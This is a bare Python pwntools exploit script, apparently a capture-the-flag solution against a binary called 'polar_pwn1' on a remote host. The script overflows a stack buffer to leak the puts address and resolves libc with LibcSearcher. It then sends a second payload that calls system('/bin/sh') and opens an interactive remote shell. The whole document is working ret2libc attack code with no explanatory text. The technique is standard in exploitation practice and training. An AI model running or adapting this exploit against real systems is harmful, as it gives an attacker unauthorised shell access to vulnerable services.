from pwn64 import *
from LibcSearcher import *

io = remote('1.95.36.136', 2137)
# io = process("./pwn")
elf = ELF('./polar_pwn1')
# libc= ELF(elf.libc.path)

main_add = 0x08048591
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset = 0x3A

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendafter(b'like', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)  # libc6-i386_2.27-3ubuntu1_amd64

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0) + p32(bin_sh_add)

io.sendafter(b'like', payload2)

io.interactive()